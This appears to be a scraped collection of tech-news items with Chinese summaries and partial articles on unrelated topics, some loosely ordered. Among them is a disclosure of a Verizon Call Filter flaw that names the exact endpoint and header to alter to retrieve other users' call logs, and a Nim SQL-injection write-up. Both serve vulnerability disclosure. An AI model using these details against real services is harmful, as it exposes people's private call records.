主要讨论点：针对LLM（大型语言模型）评估和PaperBench基准测试的讨论

不同观点：
• **[no_multitudes]** 对测试结果的质量提出质疑。认为论文或代码中缺乏具体的输出示例，仅仅给出LLM对其他模型代码的评分（如21%）并不具有定性意义。
  
• **[smusamashah]** 提供了具体的测试结果，指出表现最好的模型Claude 3.5 Sonnet在PaperBench上的平均复制得分为21.0%，支持了该基准测试工具的有效性。

• **[tetris11]** 对该项目的归属权表示担忧，认为由营利性公司主导可能存在利益冲突，尤其在AI竞赛中拥有巨大利益的公司。

• **[amelius]** 对AI辅助阅读论文的用户界面（UI）表示兴趣，认为这是一个值得发展的方向，而不是仅仅关注代码复现。

• **[timabdulla]** 对人类专家的表现提出疑问，认为如果是顶尖的博士生，应该能在超过48小时的努力后接近100%地复制论文结果。

• **[DrillShopper]** 误解了PaperBench的用途，认为它类似于GPU基准测试软件，表明对该工具的定位存在不同认知。

• **[riku_iki]** 质疑基准测试的目标，不明白为什么在已有GitHub代码的情况下，还需要重新生成代码来复制论文结果。

• **[antonkar]** 提出了一个全球性的AI安全解决方案，建议将所有GPU集中到由国际科学家控制的云端，以防止AI被不法分子利用。这一观点虽然与主讨论点不完全相关，但涉及到了AI安全和风险管理。

补充讨论：
• **关于结果的透明性和质量**：no_multitudes和smusamashah的观点形成了对比，前者质疑结果的定性意义，后者提供了具体数据支持测试有效性。
  
• **关于项目主导权和利益冲突**：tetris11的观点提出了对营利性公司主导科研项目的担忧，引发了对科研公正性和独立性的讨论。

43559855.article_content:
Restructuring Announcement
Automattic
·
April 2, 2025
Earlier today, CEO Matt Mullenweg shared with Automattic employees the following message.
I have had to make difficult decisions to protect Automattic’s long-term future. This post will outline why the changes are happening and the next steps in our organizational restructuring. I wish to be transparent and acknowledge immediately that this will be difficult news to hear. We will do everything to ensure that all Automatticians, those staying and those leaving, are supported.
Why We’re Making Changes
We have reached an important crossroads. While our revenue continues to grow, Automattic operates in a highly competitive market, and technology is evolving at unprecedented levels. To support our customers and products, we must improve our productivity, profitability, and capacity to invest.
As difficult as this decision has been, we are restructuring the company to:
Become more agile and responsive.
Break down silos that have created inefficiencies.
Focus on product quality, doing fewer things better.
Ensure a viable financial model for long-term success.
What This Means
This restructuring will result in an approximately 16% workforce reduction. HR will email those impacted to inform them they will leave Automattic with financial and support benefits.
Supporting Those Affected
This process is complex with Automatticians in 90 countries, but we’re committed to communicating clearly and compassionately. Colleagues who will be leaving will receive:
A comprehensive package covering severance pay and benefits.
Retention of company laptops.
Job placement resources.
They also have our enduring gratitude for their time with the company.
Looking Forward
Automattic has multiple products with world-touching potential in WordPress and beyond. I’m confident we will come out of this situation in a better position, poised to create a vibrant, profitable, well-designed company that will continue our mission to democratize the internet. I would ask that you take a moment to thank and appreciate the efforts of your teammates who have left the company, reflect on how you will move forward as an individual and Automattician, and join me in the vital work we have in front of us. I recognize this is a difficult time. In the coming weeks, we’ll share more about our path forward and how we’ll work together to strengthen our company.
We understand that you may wish to access support and discuss this with those close to you. I’d like to remind you that Automattic partners with Workplace Options, which provides emotional and practical well-being support if you seek advice from an external provider.
[links to resources for employees, redacted]
As always, your HR Wranglers are here to talk with you and support you.

data.title: Hacking the call records of millions of Americans
data.author: voxadam
data.article_summary:
文章揭示了Verizon Call Filter iOS应用中的一个安全漏洞，该漏洞允许攻击者获取Verizon无线用户的通话记录，包括来电号码和时间戳，而无需设备入侵或密码猜测。漏洞的关键在于，应用在请求通话记录时，服务器未验证请求的电话号码是否与登录用户匹配。攻击者只需修改请求中的电话号码，即可获取其他用户的通话历史。

此漏洞不仅侵犯隐私，还可能对特定人群如家暴幸存者、执法人员和公众人物构成安全威胁。通话元数据可用于重建个人日常活动、识别频繁联系人，并推断私人关系。时间戳与其他信息结合，可能暴露个人行踪和私密联系方式。

技术上，问题出在应用使用的一个未适当验证用户身份的API端点。该漏洞可能影响所有或绝大多数Verizon用户，因其Call Filter服务可能默认开启。这一漏洞不仅导致大量用户信息泄露，还可能被用作实时监控工具。
data.comments_summary:

• [dotty-] 提到Verizon Call Filter应用使用了一个看起来非常内部化的域名来查询用户通话记录，暗示这种命名方式可能反映出安全措施不到位。

• [devmtk] 对Verizon这样的大公司出现这种低级错误感到震惊，质疑公司的渗透测试和安全责任人，并担心是否有其他数据泄露的风险。

• [adxl] 提出疑问，如何才能像发现此类漏洞的人一样找到新的安全漏洞，并建议通过逆向工程应用或监控请求来寻找漏洞，以参与漏洞赏金计划。

补充讨论：

• 讨论中还涉及到对漏洞赏金计划的期望以及对大公司和媒体关系的批评。

43558550.article_content:
Hacking the Call Records of Millions of Americans
Imagine if anyone could punch in a phone number from the largest U.S. cell carrier and instantly retrieve a list of its recent incoming calls—complete with timestamps—without compromising the device, guessing a password, or alerting the user.
Now imagine that number belongs to a journalist, a police officer, a politician, or someone fleeing an abuser.
This capability wasn’t a hypothetical.
I recently identified a security vulnerability in the
Verizon Call Filter iOS app
which made it possible for an attacker to leak call history logs of Verizon Wireless customers.
Call logs can be quite valuable, especially for nation states, as recently noted in coverage of the Salt Typhoon breach of telecom networks:
https://www.nytimes.com/2024/10/25/us/politics/trump-vance-hack.html
Given that this data is of such value, you’d expect that both how it’s accessed, and who is given access would be closely guarded. However, as I found, this may not be the case.
High level overview:
In order to display your recent history of received calls in the Verizon Call Filter app, a network request is made to a server. That request contains various details such as your phone number and the requested time period for call records. The server then responds with a list of calls and timestamps for each.
So surely the server validated that the phone number being requested was tied to the signed in user? Right? Right?? Well…no. It was possible to modify the phone number being sent, and then receive data back for Verizon numbers not associated with the signed in user.
In short, anyone could lookup data for anyone.
This is of course a privacy concern for all. But for some this could also represent a safety concern.
Consider scenarios involving survivors of domestic abuse, law enforcement officers, or public figures—individuals who rely on the confidentiality of their communication patterns. Having their incoming call logs exposed is not just invasive; it’s dangerous.
Call metadata might seem harmless, but in the wrong hands, it becomes a powerful surveillance tool. With unrestricted access to another user’s call history, an attacker could reconstruct daily routines, identify frequent contacts, and infer personal relationships.
Timestamps can be cross-referenced with social media or public sightings to map physical movements. Repeated numbers expose private or burner lines, compromising whistleblowers, journalists, or abuse survivors.
This wasn’t just a data leak. It was a real-time surveillance mechanism waiting to be abused.
Technical details:
The Verizon Call Filter app uses the endpoint
https://clr-aqx.cequintvzwecid.com/clr/callLogRetrieval
to lookup call history for the authenticated user and display it in the app.
This endpoint requires a JWT (JSON Web Token) in the Authorization header using the Bearer scheme and uses an
X-Ceq-MDN
header to specify a cell phone number to retrieve call history logs for.
A JWT has three parts: header, payload, and signature. It’s often used for authentication and authorization in web apps.
The payload in this case looked like:
{
"sub"
:
"SIGNED_IN_USER_PHONE_NUMBER_HERE"
,
"iat"
:
"1740253712"
,
"iss"
:
"df88f1ed1dfd9a903e4c8dca7f00089e134c6c4e0a566cd565147ba1dadf78a6"
,
"secret"
:
"REDACTED"
,
"alg"
:
"ECDSA-256"
,
"exp"
:
"1740255512"
}
sub
stands for subject — it identifies who the token is about (usually the user ID). In this case that is a phone number of the signed in user.
What should have been happening, and did seem to take place on other endpoints for additional app functionality, is that the server would compare the phone number specified in the request to the user identifier (sub) in the JWT, to ensure that the user requesting the information should have access to it.
However, the
/clr/callLogRetrieval
endpoint was not validating that the phone number specified in the
X-Ceq-MDN
header matches the
sub
in the JWT payload, meaning it was possible to lookup call history logs for any phone number within the application by passing the desired phone number in the value of that header.
Example Vulnerable Request:
The issue I discovered impacted at least those who have the Verizon Call Filter service enabled (I did not test a number which had it disabled; I can’t rule out whether or not all Verizon numbers could have been impacted).
Based on
https://www.verizon.com/support/call-filter-faqs/
and

43558550.article_summary:
文章揭示了Verizon Call Filter iOS应用中的一个安全漏洞，该漏洞允许攻击者获取Verizon无线用户的通话记录，包括来电号码和时间戳，而无需设备入侵或密码猜测。漏洞的关键在于，应用在请求通话记录时，服务器未验证请求的电话号码是否与登录用户匹配。攻击者只需修改请求中的电话号码，即可获取其他用户的通话历史。

此漏洞不仅侵犯隐私，还可能对特定人群如家暴幸存者、执法人员和公众人物构成安全威胁。通话元数据可用于重建个人日常活动、识别频繁联系人，并推断私人关系。时间戳与其他信息结合，可能暴露个人行踪和私密联系方式。

技术上，问题出在应用使用的一个未适当验证用户身份的API端点。该漏洞可能影响所有或绝大多数Verizon用户，因其Call Filter服务可能默认开启。这一漏洞不仅导致大量用户信息泄露，还可能被用作实时监控工具。
43558550.comments_summary:
主要讨论点：Verizon电话号码及通话记录数据泄露的安全漏洞及其影响

不同观点：
• [twalkz] 指出Verizon的服务器未能验证请求的电话号码是否与登录用户绑定，导致用户可以修改请求的电话号码，获取与其他Verizon用户相关的数据。他认为这是Verizon的一个重大疏忽，并希望公司在披露漏洞时能告知此前是否有其他人利用过该漏洞。

• [dotty-] 提到Verizon Call Filter应用使用了一个看起来非常内部化的域名来查询用户通话记录，暗示这种命名方式可能反映出安全措施不到位。

• [devmtk] 对Verizon这样的大公司出现这种低级错误感到震惊，质疑公司的渗透测试和安全责任人，并担心是否有其他数据泄露的风险。

• [adxl] 提出疑问，如何才能像发现此类漏洞的人一样找到新的安全漏洞，并建议通过逆向工程应用或监控请求来寻找漏洞，以参与漏洞赏金计划。

• [vivzkestrel] 好奇如何能发现这些漏洞，询问是否需要全职从事这种工作，或者是否可以通过系统化的方式找到未被发现的漏洞。

• [grg0] 质疑为什么这一事件没有成为新闻头条，认为政府通常夸大外国势力对公民的干扰，但对公司漏洞却视而不见，暗示大公司对媒体和国会的控制。

data.title: Ace: Realtime Computer Autopilot
data.author: huerne
data.article_summary: Ace是一个计算机自动驾驶仪，能够使用鼠标和键盘执行桌面任务。它在计算机任务上表现优于其他模型，相关模型和任务套件已开源。Ace通过屏幕和提示执行操作，由专家团队训练，已完成超过一百万次任务。尽管Ace速度极快，但仍可能出错，随着训练资源的增加，其智能和能力将不断提升。目前，Ace的早期研究预览版已发布，邀请用户参与试用。
data.comments_summary:
主要讨论点：大型语言模型（LLM）在处理复杂任务（如预订旅行）时的能力和局限性，以及用户对LLM应用的期望与现实之间的差距。

不同观点：
• joshstrange：对LLM在处理复杂任务（如自动预订旅行）时的能力持怀疑态度。他认为当前的LLM无法处理所有必要的情况，特别是在需要综合考虑多个因素（如费用、位置、价格和设施）时。他批评了LLM社区中常见的“随着时间推移，模型会变得更好”的乐观态度，指出LLM问题的解决并不像传统软件问题那样简单，且训练和调整模型的过程耗时且昂贵。他还提到自己不愿意依赖此类系统，因为担心出错的风险。
• vivzkestrel：分享了一篇题为“反对对话界面的案例”的文章链接，暗示对对话式界面的质疑。
• iamleppert：对招聘用例表示幽默回应，表明对某些应用场景的娱乐性。
• the__alchemist：表示对帖子内容与标题预期不符的惊讶。
• sherjilozair：作为General Agents的创始人兼CEO，表示愿意回答问题，展示了对讨论的开放态度。
• lilyhills03 和 cbiscuit：对帖子内容表示兴奋和支持。
• misbah143：对LLM和计算机代理的未来持乐观态度，认为其发展迅速且前景广阔。

补充讨论：
• joshstrange详细描述了LLM在处理实际任务（如预订旅行）时的不足，包括无法处理所有必要的情况、输出结果看似合理但不准确或完整，以及训练和调整模型的困难。
• 争议的焦点在于LLM在处理复杂任务时的实际能力和用户的期望之间的差距。joshstrange对当前LLM的能力持怀疑态度，而misbah143则对LLM的未来持乐观态度。
• vivzkestrel分享的文章链接可能提供了对对话式界面的进一步批评，值得进一步阅读和讨论。

总体而言，讨论涉及了对LLM当前能力的质疑、对未来发展的不同预期以及对具体应用场景的幽默和支持。

data.title: Practical Prolog Planner Prompting
data.author: tannhaeuser
data.article_summary: 本文探讨了将大型语言模型（LLMs）与Prolog结合用于自动规划的任务。虽然LLMs在语言翻译和总结方面表现出色，但在规划等推理任务上表现有限，且结果高度依赖训练数据。因此，文章建议让LLMs将自然语言转化为Prolog代码，而不是直接进行规划。Prolog作为一种逻辑编程语言，适合用于表示规划问题，其内置的`asserta/1`、`assertz/1`和`retract/1`等功能可以有效描述状态变化。LLMs生成初步Prolog代码后，再通过自动化工具进一步优化。这种方法利用了LLMs的翻译能力和Prolog的组合搜索优势，为自动化规划提供了实用的解决方案。文章还提到早期Prolog规划系统WARPLAN及使用Prolog解决集装箱运输问题的实例。
data.comments_summary:
主要讨论点：提供解决问题的不同工具和方法

不同观点：
• Tannhaeuser建议使用一个简化的前端界面来生成问题求解器。这个工具允许用户“自带 endpoint”来生成适合自己问题的求解器，或者直接在浏览器中使用本地的演示求解器。该方法强调了工具的灵活性和易用性，尤其是在本地操作和自定义方面的优势。

• 隐含的另一种观点是，用户可能会选择不使用外部工具或前端界面，而是依赖于其他方法（如手动编码或使用不同的求解器）来解决问题。虽然未明确提及，但这种选择可能基于用户的特定需求、技术背景或对工具的不熟悉。

补充讨论：
• 评论中提到了两个具体的求解方式：一是通过自带 endpoint 生成求解器，二是使用浏览器中的本地演示求解器。这表明该工具提供了多种使用方式以适应不同用户的需求。
• 链接提供的工具可能更适合希望快速测试或应用解决方案的用户，尤其是那些不一定需要深度定制或复杂计算的用户。
• 争议的焦点可能在于工具的适用性和用户的技术能力要求。对于技术能力较弱的用户，简化的前端界面可能非常有帮助；但对于有特定需求或高级技术能力的用户，他们可能更倾向于选择其他解决方案。

43558622.article_content:
Quantum Prolog
Using Large Language Models to generate Prolog planners
Combining the strength of Large Language Models (LLMs) with Prolog
combinatorial search is a natural fit actually delivering
tangible progresses in mainstream automated planning.
State of the art in LLM-generated planners
Parts of the public discussion about LLMs revolves around unachievably
high goals such as "General AI", but LLMs are just statistical language
models after all and excel in language translation and summarization tasks
foremost. And while LLMs
can
be trained to do almost anything including
optimization and other math and reasoning tasks, it's exceedingly clear results
are determined by the used training data sets, and remain highly
volatile and unpredictable for problems outside that set, a fact well known
acknowledged in papers such as
aiw
and
posp
.
Rather than having LLMs perform planning itself, it's thus
only natural to complement LLMs with the raw combinatorial power
of Prolog, much like a human would be reaching out to a pocket
calculator. Or, as
tnltopgwl
formulates it
Our empirical results [...] show that LLMs are much better
suited towards translation rather than planning.
Putting LLMs to use for translating natural language
into Prolog is also a straightforward extension of its original goals
considering Prolog was originally devised for natural language processing.
Planning being another field of application right from the start
for Prolog, it isn't surprising many researchers are experimenting
with Prolog, Contraint Logic Programming (CLP), and
other logic-based programming (LP) languages as a target for code
generation using LLMs (see the bibliography for a small selection of
reports).
Practicitioners are also turning to solutions targetting Prolog
rrbnl
after having observed (
swipldiscourse1
)
that targetting domain-specific planning languages and
formalisms lacking the inherit logical underpinnings that Prolog has,
such as the one discussed in
tnltogw
, after
initial promising results to hit a road block.
And while chain-of-thought (CoT) approaches have reported vast improvements
in reasoning LLMs, those results remain highly specific to the
training data and thus require training sets that neither exist
nor can easily be generated (as briefly discussed below), which is
acknowledged in
cotplanning
:
[Our results] spotlights drawbacks of chain of thought, especially the sharp
tradeoff between possible performance gains and the amount of human
laber necessary to generate examples with correct reasoning traces.
However, essential CoT approaches for guiding LLMs using templated solutions,
controlled language, and stratified, stepwise solving of sub-goals
are disciplines that come naturally and directly by
instructing LLMs to generate domain-specific Prolog
source, further suggesting Prolog code to be an excellent
fit as an LLM target.
Extending container planning into generic planning
We're briefly mentioning
WARPLAN
here, one of the earliest
Prolog-based planning systems created by David Warren, who is known in
the Prolog world for introducing the Warren Abstract Machine as the basis
for performant 1980s Prolog implementations, with many Prolog engines still
using it today. WARPLAN was a straightforward implementation of STRIPS
planning in Prolog, only adding a convention for action post-conditions,
which came in the form of
add(pred(..))
and
del(pred(...))
literals.
In our planner for the container problem developed in
Planning container shipping using Prolog
,
we're making use of Prolog
asserta/1
,
assertz/1
, and
retract/1
builtins to encode state changes produced by actions instead. The
benefits of doing so (apart from not being restricted to mere prepositional
states) is now evident when putting LLMs to use, since generating Prolog
action predicates containing vanilla
asserta/1
,
assertz/1
,
and
retract/1
builtins is directly supported in existing LLMs and
training data, whereas WARPLAN-like abstractions and formalism
would need extra training to make it practical.
As explained in
Advanced combinatorial planning
,
the destructive nature of
asserta/1
and co. is usually insufficient
to capture even slightly elaborate planning models, but that's not a problem
since we can automatically rewrite action predicates into a form using the
vardb-feature, as also already explained in above reference.
That's right — we're expecting the LLM to translate our input problem
description into basically
naive
Prolog code and will change that code
the LLM is generating into a refined form.
We're also instructing the LLM to
not
attempt to actually generate
a solution predicate, which might need further explanation: what we want from
the LLM is Prolog code for
state clauses: dynamic facts encoding the current state of our
planning domain, starting with the initial state
action clauses: state-change predicates that represent actions
available in our universe as given in our textual description, that
alter state change using

data.title: Item Flow, Part 1: A new unified concept for layout
data.author: ulrischa
data.article_summary: 这篇文章介绍了一种新的统一布局概念——"Item Flow"，旨在合并CSS中的Flexbox和Grid布局系统，同时解决“瀑布”（masonry）布局问题。当前，Flexbox和Grid无法完全实现一些设计师期望的布局效果，比如瀑布布局，仍需借助JavaScript库。文章提出了一种新的属性系统，名为"item-flow"，包含四个子属性："item-direction"（内容流向）、"item-wrap"（换行控制）、"item-pack"（密集排列）和"item-slack"（布局松弛控制）。这种新系统旨在统一和扩展布局能力，使Flexbox和Grid具备更多功能，如Flexbox的密集排列和Grid的关闭换行功能。文章邀请开发者社区对这一新概念提出意见，并表示将在后续文章中进一步探讨其对未来布局的影响。

43559986.article_content:
Item Flow, Part 1:
A new unified concept for layout
Mar 28, 2025
by
Jen Simmons, Saron Yitbarek, Elika Etemad, Brandon Stewart
Contents
Combining Flexbox and Grid
Item Direction
Item Wrap
Item Pack
Item slack
The Overall Plan
What do you think?
CSS Grid and Flexbox brought incredible layout tools to the web, but they don’t yet do everything a designer might want. One of those things is a popular layout pattern called “masonry” or “waterfall,” which currently still requires
a Javascript library
to accomplish.
Masonry layouts in CSS feature was first proposed by Mozilla and implemented in Firefox behind a flag
in 2020
. From the beginning, there’s been a hot debate about this mechanism. The WebKit team at Apple picked up where Mozilla left off, implemented the drafted spec, and landed it in
Safari Technology Preview 163
. This reinvigorated the conversation. By October 2024, there were two competing ideas being debated — to “Just Use Grid” or to create a whole “New Masonry Layout”.
We wrote extensively about these ideas
in a previous article on this website.
A lot has happened since October. Now, a third path forward is emerging — a path that would mean the CSS Working Group doesn’t choose either “Just Use Grid” or “New Masonry Layout”. It merges ideas from both with a completely-new idea to create a unified system of Item Flow properties. This article explains what Item Flow is, and its impact on both Flexbox and Grid. In Part 2, another article will more fully explain the implications for the future of masonry-style layouts.
But first, why is a third possibility called Item Flow emerging at all? Why not just pick between the “Just Use Grid” and “New Masonry Layout” options? Well, back in October, the folks working on masonry
asked the W3C Technical Architecture Group (TAG) to weigh in
on the debate. The TAG had
a lengthy response
, but one of the most interesting parts was this:
Overall, we think masonry, grid, and wrapping-flexbox should be incorporated into a unified set of properties. Chrome’s [New Masonry Layout] proposal splits apart property sets too eagerly, but even the WebKit [originally Mozilla | Just Use Grid] proposal seems to miss a chance to develop more-general properties.
Wow. Incorporate Flexbox, Grid and Masonry into a unified set of properties? What would that even look like?
The suggestion isn’t to combine all of Flexbox with all of Grid — but rather to create a new set of properties and values to “replace” specifically the
flex-flow
and
grid-auto-flow
properties. (You will always be able to use the older syntax if you prefer.) Think how originally the
Alignment properties
and the
gap
property were defined to work only in one layout system, and then later got modified and extended to work in multiple layout contexts.
Several of us here at Apple got together and started figuring out how a such unified system for layout
*-flow
could work. We decided to tentatively name the shorthand
item-flow
. It’d be the main property from which the longhands and values follow. Together, the new rules would all control the direction of flow, how items wrap, how items pack, whether or not there’s “slack” in the layout, and more.
As we worked through the details, we started to get excited. Suddenly new features for Flexbox and Grid that people have wanted for years had an obvious home. Things seemed to click together elegantly. New capabilities emerged:
Flexbox could gain a way to do dense packing
Grid could gain the ability to turn off wrapping
Masonry layouts could now be triggered with a value for
item-flow
and more…
In this article, we want to describe Item Flow to you, the people who make websites and web apps, to see what you think. So, let’s go on a journey to imagine what this future would be like…
Combining Flexbox and Grid
Flexbox has
flex-flow
. It’s a
shorthand
for these two longhands:
flex-direction: row | row-reverse | column | column-reverse;
flex-wrap: nowrap | wrap | wrap-reverse;
Flex-direction determines which direction the content flows, while flex-wrap determines whether or not to wrap content.
CSS Grid has
grid-auto-flow
.
grid-auto-flow: row | column | dense;
It determines the direction in which the content flows, and whether or not dense packing is used, all in one property. It has no longhands.
So how shall we unify these capabilities? We proposed calling the new shorthand
item-flow
, with four new longhands:
item-direction
item-wrap
item-pack
item-slack
(It’s important to note all of these are brand new, baby fresh ideas. They will get discussed at length and changed before they become reality in browsers. To make this article readable, we are glossing over the current debates and presenting just one name for each property/value, not listing the all the variations proposed at the CSSWG.)
Item Direction
The
item-direction
property would determine how content flows. Should content flow in rows or columns? In the normal direction or reversed? This would work just like
flex-direction
43559986.article_summary: 这篇文章介绍了一种新的统一布局概念——"Item Flow"，旨在合并CSS中的Flexbox和Grid布局系统，同时解决“瀑布”（masonry）布局问题。当前，Flexbox和Grid无法完全实现一些设计师期望的布局效果，比如瀑布布局，仍需借助JavaScript库。文章提出了一种新的属性系统，名为"item-flow"，包含四个子属性："item-direction"（内容流向）、"item-wrap"（换行控制）、"item-pack"（密集排列）和"item-slack"（布局松弛控制）。这种新系统旨在统一和扩展布局能力，使Flexbox和Grid具备更多功能，如Flexbox的密集排列和Grid的关闭换行功能。文章邀请开发者社区对这一新概念提出意见，并表示将在后续文章中进一步探讨其对未来布局的影响。

Pixel Watch Guides on WOA-Project Github organisation
Also there is a section at the bottom outlining other things I am releasing at the end of this week. Scroll down if you do not care about the time 😉
Many years of spending, sorry, losing time making Windows on ARM run on anything not a computer, I started getting bored
What could be the next project really? Years of wondering about, diverging into

The answer was ALWAYS under my eyes. Yes! Making windows run
on an ARM

smartwatch
How did I never think of this before!

Pixel Watch Guides on WOA-Project Github organisation

Quad core sixty four bits ARM Cortex A53 cluster
2 whole GBs of DDR4X RAM
32GB of eMMC storage

it texts

can touch this, world first circular touch screen
it smol
cute
its a freaking watch
has all the functionality you have on your phone. So why wasting your time on phones, get watch, watch is the superior technology, not fish
Getting Windows to run on your ARM
Now that the story line is laid out (see above), let's get a victim, sorry, test subject (we will pretend for the sake of the writer sanity this whole thing did not start just because of the Windows on ARM pun)
Chosen was the
Google Pixel Watch 3 (Large LTE Model)
that came out late last year, notably because thats what I had, and also because it featured everything my 2 grand USD phone had, for only a quarter of the price (I did tell you why are we bothering with expensive phones)
The watch runs on Android 15 (originally Android 14 but more on that later), has an unlockable bootloader, and unfortunately features Google conception of reinventing how to boot linux yearly (more on that later too)
My newly obtained watch on the very first day of ownership, doing what every single normal user would do, mess with it
The watch uses a Snapdragon W5 Gen 1 (Part number SW5100) combined with 2GB of DDR4X ram on 32GB of eMMC storage
This is more than enough for a smartwatch, let's face it, but also enough for us. It using a Qualcomm chipset means i could reuse all my experience messing with previous hardware using Qualcomm chipsets easily and tap onto easily accessible opensource code repos (including, Google own)

Modern Qualcomm firmware, means we are already dealing with an UEFI here, in XBL (Qualcomm own eXtensible Boot Loader). So armed with the watch of all of this knowledge the very first step has been to backup the watch using a rooted boot image, and inspect.
This is not fun
Then doing the very same steps of, painfully taking back all EFI files from the stock uefi, and adapting them to run in my own UEFI environment. We suddenly, are in UEFI land.
After hours of patching and figuring out correct load order (apriori was all wrong somehow) we are at a shell!

data.title: Real-Time Introspective Compression for Transformers
data.author: eigenvalue
data.article_summary: 文章提出了一种用于Transformer模型自省（introspection）的新方法，旨在解决两大问题：缺乏自省能力和认知的短暂性。大型Transformer模型在推理过程中产生大量中间数据，但这些数据在每次前向传播后即被丢弃，无法检查或回滚。文章认为，尽管Transformer的维度很高，其激活状态实际上可能位于低维流形上，因此可以被压缩为较小的潜在表示。文章提出使用一个辅助模型（sidecar model）来将这些内部状态编码为紧凑的潜在表示，从而实现高效的保存、压缩和重构，支持推理回溯和元认知控制等高级功能。这种方法有助于提高模型的可解释性、调试能力和整体性能。

• [lurker919] 提到策略蒸馏似乎类似于梯度更新，但可能是在更高的抽象层次上。此观点将策略蒸馏与传统的梯度更新方法进行类比，讨论其抽象层次的差异。

• [neuroelectron] 引用Gemini Pro的观点，认为该方法由于计算成本过高而不切实际，甚至怀疑其为愚人节玩笑。此观点质疑方法的可行性，强调计算成本问题。

• [trextrex] 提出该方法类似于递归神经网络（RNN），暗示该方法可能并不新颖，只是对已有概念的重新应用。此观点挑战新颖性，试图将其与已有技术联系起来。

• [eigenvalue] 深入探讨了LLM无法直接访问自身内部状态的局限性，并提出通过一个小的辅助模型来压缩和解压缩内部状态的创新方法。该观点详细描述了技术实现的潜在方式及其带来的新能力，如回溯、调试和探索替代决策路径，最终提出构建具有反思和自我改进能力的AI系统的愿景。

补充讨论：
• eigenvalue的评论最为详尽，提出了一个完整的概念框架和技术路线，并将其提升到构建“元认知操作系统”的高度，旨在让AI在复杂推理任务中不断优化和跨领域转移技能。该评论还提供了一个详细的学术论文链接，供进一步阅读。

• 争议的焦点主要在于方法的可行性和新颖性。neuroelectron质疑计算成本和实际可行性，而trextrex则质疑其是否真正带来了新的技术突破。

• 讨论还涉及抽象层次和类比，lurker919试图将策略蒸馏与梯度更新进行对比，以理解其抽象层次的差异。

Real-Time Introspective Compression for Transformers
By Jeffrey Emanuel (and various collaborators of the electronic persuasion)
Written on April 1st, 2025
Introduction: Two Intertwined Problems
Transformer-based large language models (LLMs) face two significant limitations that restrict their capabilities:
Lack of Introspection
: Unless specifically instrumented, transformer-based LLMs have no ability to explicitly access their own internal states—the activations in their feed-forward layers, attention mechanisms, and other components. This opacity hinders mechanistic interpretability, self-monitoring, and dynamic reasoning.
Ephemeral Cognition
: Most LLM "thinking" is fleeting—activations across billions of parameters that change during forward passes as the model processes tokens. Recording this data naively is computationally prohibitive due to its sheer volume.
These limitations have profound implications for interpretability, debugging, and developing more capable AI systems. This article proposes a novel approach to address both problems simultaneously.
The Problem: Transformer Black Boxes
Large transformer models generate massive volumes of intermediate data during inference. Each token step produces new hidden states, attention maps, and cached key/value tensors. These are ephemeral by design: they're discarded after each forward pass, with no built-in mechanism for inspection, rollback, or resumption.
Naively saving the full state at each step is computationally prohibitive. A model like GPT-3, storing full activations and attention caches per token, can consume hundreds of megabytes per sequence. Existing approaches like PCA, quantization, or simple delta encoding are lossy and often irreversible, making them unsuitable for applications requiring high-fidelity recovery.
We lack a practical way to
pause
,
inspect
, and
replay
a model's internal state with precision.
Theoretical Insight: The Transformer Thinks on a Low-Dimensional Manifold
Despite their high dimensionality, transformer activations likely occupy a small portion of the possible state space. They appear to live on a lower-dimensional, structured manifold shaped by several factors:
Pretraining Dynamics
: Models learn to represent language efficiently, creating structured internal representations.
Architectural Constraints
: Attention mechanisms and layer normalization impose patterns on activation distributions.
Semantic Priors
: Natural language has inherent structure that shapes model activations.
Task-Driven Optimization
: Fine-tuning carves task-specific trajectories through this space.
This hypothesis draws from observations in neural network representations and suggests that transformer states could be compressed into smaller latent representations without losing critical information, much like a map reduces a terrain to key coordinates.
This raises a compelling possibility: what if we could encode those internal states directly onto this manifold? Instead of treating the activations as raw data, we could represent them as
coordinates on a latent terrain
.
The Analogy: Transformer State as a Video Game Save
Think of a transformer as a single-player game engine. Each inference step is like a frame rendered during gameplay. Normally, you don't save every frame—you save
the game state
: player position, inventory, mission flags, world state. This compact representation allows you to stop, rewind, branch, or resume seamlessly.
We want the same thing for transformer inference: a way to save the
complete thought state
at a given point in a sequence, using as little space as possible, but with the ability to
reconstruct it with high fidelity
later.
Technical Proposal: Sidecar Transformers for State Compression
We propose a system for high-efficiency introspective compression, built around a learned latent manifold of transformer states. This introduces a lightweight
sidecar model
that rides alongside a host transformer, encoding its internal state into a compact latent representation
z_t
, from which the full state can be recovered.

43559228.article_summary: 文章提出了一种用于Transformer模型自省（introspection）的新方法，旨在解决两大问题：缺乏自省能力和认知的短暂性。大型Transformer模型在推理过程中产生大量中间数据，但这些数据在每次前向传播后即被丢弃，无法检查或回滚。文章认为，尽管Transformer的维度很高，其激活状态实际上可能位于低维流形上，因此可以被压缩为较小的潜在表示。文章提出使用一个辅助模型（sidecar model）来将这些内部状态编码为紧凑的潜在表示，从而实现高效的保存、压缩和重构，支持推理回溯和元认知控制等高级功能。这种方法有助于提高模型的可解释性、调试能力和整体性能。

data.title: When parameterization fails: SQL injection in Nim using parameterized queries
data.author: xx_ns
data.article_summary:
本文介绍了Nim语言的`db_postgres`模块中存在的一个SQL注入漏洞。该漏洞影响在较旧的PostgreSQL数据库或配置中使用该模块的应用程序，尤其是在`standard_conforming_strings`设置被禁用的情况下。正常情况下，该模块通过参数化查询防止SQL注入，但当`standard_conforming_strings`被关闭时，模块对特殊字符（如反斜杠和单引号）的处理不当，可能导致SQL注入。

具体来说，当该设置为"off"时，攻击者可以通过输入包含反斜杠的字符串操纵SQL查询，绕过身份验证或执行其他恶意操作。Java的PostgreSQL驱动在这方面处理更为完善，根据`standard_conforming_strings`的状态采取不同的字符转义策略，而Nim的实现则存在不足。

要修复此问题，建议开发者确保PostgreSQL的`standard_conforming_strings`设置为"on"，或升级Nim模块以改进参数转义逻辑。
data.comments_summary:
主要讨论点：参数化查询与文本模板的区别及其风险

不同观点：
• jiggawatts 认为原文作者（OP）所描述的并非真正的参数化查询，而只是文本模板替换。这种做法容易引发风险，尤其是SQL注入等安全问题。
• 他指出，微软的SQL客户端代码在处理查询参数时，不会将转义后的参数直接插入查询文本中，而是先发送带有占位符的查询，然后单独编码发送参数值。这种方法可以避免文中提到的问题。

补充讨论：
• jiggawatts 提到，通过使用占位符和独立发送参数值，数据库引擎可以更轻松地缓存查询，而不受具体参数值的影响。这种设计被认为更加安全和高效。
• 争议焦点在于文本模板替换与真正的参数化查询之间的区别，以及文本模板可能带来的安全风险。

43558332.article_content:
I discovered a potential SQL injection vulnerability in Nim's standard library module
db_postgres
. This affects applications using this module with older PostgreSQL databases or configurations where
standard_conforming_strings
is disabled.
